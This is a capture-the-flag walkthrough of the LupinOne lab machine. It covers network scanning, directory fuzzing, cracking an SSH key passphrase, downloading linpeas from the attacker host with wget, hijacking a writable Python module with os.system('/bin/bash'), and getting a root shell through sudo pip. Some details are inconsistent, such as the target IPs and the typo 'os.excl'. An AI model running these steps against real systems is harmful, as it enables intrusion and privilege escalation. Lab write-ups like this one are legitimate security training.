<h1 align="center">LupinOne Penetration Testing Walkthrough</h1>
<h3 align="center">From Reconnaissance to Root Access - A Complete CTF Guide</h3>

<p align="center">
  <img src="https://img.shields.io/badge/Penetration-Testing-red" alt="Pentest">
  <img src="https://img.shields.io/badge/Difficulty-Intermediate-orange" alt="Difficulty">
  <img src="https://img.shields.io/badge/Category-CTF-blue" alt="CTF">
  <img src="https://img.shields.io/badge/Status-Completed-green" alt="Completed">
</p>

---
## Empire LupinOne Walkthrough.
## 📋 Overview.
This guide documents the complete penetration testing methodology for LupinOne, detailing each step from initial reconnaissance to privilege escalation and flag capture.

## 🎯 Objectives
- Identify the target system and open services.
- Enumerate directories and hidden files.
- Exploit vulnerabilities to gain initial access.
- Escalate privileges to obtain root access.
- Capture the flags.
  
## 1. Reconnaissance.
### **Network Discovery.**
We will first run the command;
> $ifconfig 
---
- To check what ip is allocated to the attacking machine and also determine the subnet range.

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s1.png" width="600"/> </p>

### **Host Discovery**
> $nmap -sn 192.168.56.0/24
---
- We are trying to do a ping sweep to identify live hosts within the subnet.

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s2.png" width="600"/> </p>


### **Port Scan**
> $nmap -A 192.168.56.19
---
- **-A** flag is for aggressive mode that bundles multiple flags for OS and service detection.

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s3.png" width="600"/> </p>

### Findings
From our previous scan we can see that:

- Port 22 (SSH) - OpenSSH 8.4p1 Debian 5
- Port 80 (HTTP) - Apache httpd 2.4.48

## 2. Directory Enumeration.
We navigate to the port 80 http://192.168.56.19. We are Greeted by the Photo of Arsene
Navigate to http://192.168.56.12/robots.txt. And you will not the disallowed directoty "~myfiles"y

### **FFUF Directory Discovery**
We will use ffuf to discover hidden directories on the web server:
> $ffuf -c -u http://192.168.56.19/~FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s4.png" width="600"/> </p>

### **Finding Hidden Files**
We discovered a `~secret` directory. Let's enumerate further:
> $ffuf -c -ic -u http://192.168.56.19/~secret/.FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -fc 403 -e .txt,.html,.php

This result shows a file '.mysecret.txt' which contains the ssh key.
Navigate to http://192.168.56.19/~secret/.mysecret.txt.

Copy the key and navigate to Cyberchief on your web browser to convert the ssh key. Select fromBase58 and you will see the openssh key.
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s5.png" width="600"/> </p>

## 3. SSH Key Extraction.
### **Converting SSH Key to Hash Format**
We found an SSH key that needs to be cracked:
> $ssh2john /home/kali/Desktop/lupin/sshkey.rsa > hashkey
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s6.png" width="600"/> </p>

### **Cracking the SSH Key Password**
Now we crack the ssh key to find the password.
> $john --wordlist=/usr/share/wordlists/fasttrack.txt hashkey
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s7.png" width="600"/> </p>

### **Viewing Cracked Password**
> $john --show hashkey
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s8.png" width="600"/> </p>

## 4. Initial Access.
### **SSH Connection**
Now that we have the SSH key and password, we can connect:
> $ssh -i /home/kali/Desktop/lupin/sshkey.rsa icex64@192.168.56.19
Enter passphrase: **P@55w0rd!**
---

## 5. User Flag.
### **Capturing User Flag**
> icex64@LupinOne:~$ ls
> user.txt
> icex64@LupinOne:~$ cat user.txt
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s9.png" width="600"/> </p>

## 6. Privilege Escalation.
### **Analyzing Sudo Privileges**
From the previous output, we can see:
> (arsene) NOPASSWD: /usr/bin/python3.9 /home/arsene/heist.py
This means we can run a Python script as user `arsene` without a password.

### **Examining the Script**
> icex64@LupinOne:~$ cat /home/arsene/heist.py
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s10.png" width="600"/> </p>

### **Python Module Hijacking**

The script imports the `webbrowser` module. We can exploit this by creating a malicious `webbrowser.py` file.
First, let's check for writable files:
This is possible by transferring linpeas.sh by creating a python http server over the port 8080
Navigate to the directory where the linpeas.sh file is on your local files and open a http server
> python3 -m http.server 8080 //since port 80 is in use by the lupin vm.
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s11.pngr" width="600"/> </p>

On the icex64 terminal input the following command
> icex64@LupinOne:/tmp$ wget 192.168.56.12:8080/linpeas.sh

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s12.png" width="600"/> </p>

### **Identifying Writable Python Module**
From linpeas output:

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s13.png" width="600"/> </p>

### **Modifying Webbrowser Module**
We found that `/usr/lib/python3.9/webbrowser.py` is writable. Let's modify it:
> icex64@LupinOne:/tmp$ nano /usr/lib/python3.9/webbrowser.py
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s14.png" width="600"/> </p>

### **Adding Malicious Code**
Add the following line to the webbrowser.py file:
> os.system('/bin/bash')
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s15.png" width="600"/> </p>

### **Executing as User Arsene**
Now run the script as user arsene:
> icex64@LupinOne:/$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s16.png" width="600"/> </p>

## 7. Final Privilege Escalation.
### **Using pip with Setuid**
From user arsene, we can exploit pip installation:

### **Commands Used**
> arsene@LupinoOne:/$ TF=$(mktemp -d)
> arsene@LupinoOne:/$ echo "import os; os.excl('/bin/sh', 'sh', '-c', 'sh <(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
> arsene@LupinoOne:/$ sudo pip install $TF
---

### **Root Access Achieved**
> id
> uid=0(root) gid=0(root) groups=0(root)
> whoami
> root
> cd /root
> ls
> root.txt
---

<p align="center"> <img src="https://github.com/itstallam/Empire-LupinOne/blob/main/Screenshots/s17.png" width="600"/> </p>


🔒 Security Recommendations

- Input Validation: Implement proper input sanitization to prevent SQL injection
- Password Policies: Enforce strong password policies for SSH keys
- Service Hardening: Disable unnecessary services and ports
- Module Integrity: Restrict write permissions on system Python modules
- Sudo Configuration: Limit sudo privileges and avoid NOPASSWD entries
- Regular Updates: Keep all software updated with security patches
- Log Monitoring: Implement comprehensive logging and monitoring

## 🔧 Tools Used

```bash
🛡️ Network & Service Discovery:
- ifconfig · Nmap · ffuf

🔓 Exploitation Tools:
- ssh2john · John the Ripper · SSH · Python

🔍 Information Gathering:
- linpeas.sh · cat · nano · wget

💻 System Tools:
- sudo · mktemp · pip · os
